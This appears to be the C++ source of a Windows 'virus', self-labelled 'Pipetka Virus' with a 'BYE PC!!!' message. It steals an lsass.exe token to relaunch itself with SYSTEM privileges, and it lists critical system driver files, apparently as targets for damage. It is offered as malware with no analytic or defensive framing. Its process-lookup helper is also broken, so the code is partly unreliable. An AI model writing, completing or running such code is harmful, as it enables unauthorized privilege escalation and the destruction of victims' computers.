#include <Windows.h>
#include <iostream>
#include <wchar.h>
#include <TlHelp32.h>
#include <lmcons.h>
#pragma comment(lib, "Uuid.lib")
using namespace std;
DWORD FindProcessId(const std::wstring& processName) {

	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;
	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}
}

string en[] = { "C:\\windows\\System32\\drivers\\acpi.sys",
 "C:\\Windows\\System32\\drivers\\pci.sys",
 "C:\\Windows\\System32\\drivers\\cdrom.sys",
 "C:\\Windows\\System32\\drivers\\volmgr.sys",
 "C:\\Windows\\System32\\drivers\\vdrvroot.sys",
 "C:\\Windows\\System32\\drivers\\spaceport.sys",
 "C:\\Windows\\System32\\drivers\\disk.sys",
};
void RunAsSystem() {
	SHELLEXECUTEINFO info;
	info.cbSize = sizeof(SHELLEXECUTEINFO);
	info.lpParameters = L"/main";
	info.fMask = SEE_MASK_NOCLOSEPROCESS;
	info.hwnd = NULL;
	info.lpVerb = NULL;
	info.lpDirectory = NULL;
	info.hInstApp = NULL;
	info.nShow = SW_SHOWDEFAULT;
	ShellExecuteEx(&info);
	SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);
	HANDLE hlsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindProcessId(L"lsass.exe"));
	HANDLE htok = nullptr;
	OpenProcessToken(hlsass, MAXIMUM_ALLOWED, &htok);
	HANDLE newtok = nullptr;
	DuplicateTokenEx(htok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &newtok);
	STARTUPINFO inf = { 0 };
	PROCESS_INFORMATION pinf = { 0 };
	WCHAR exepath[MAX_PATH];
	HMODULE hm = GetModuleHandle(NULL);
	GetModuleFileName(hm, exepath, MAX_PATH);
	HWND hwnd;
	if (!CreateProcessWithTokenW(newtok, LOGON_WITH_PROFILE, exepath, NULL,
		NULL, NULL, NULL, &inf, &pinf))
	MessageBoxA(NULL, "BYE PC!!!", "RunAsSystem Pipetka Virus", MB_OK | MB_ICONERROR);
}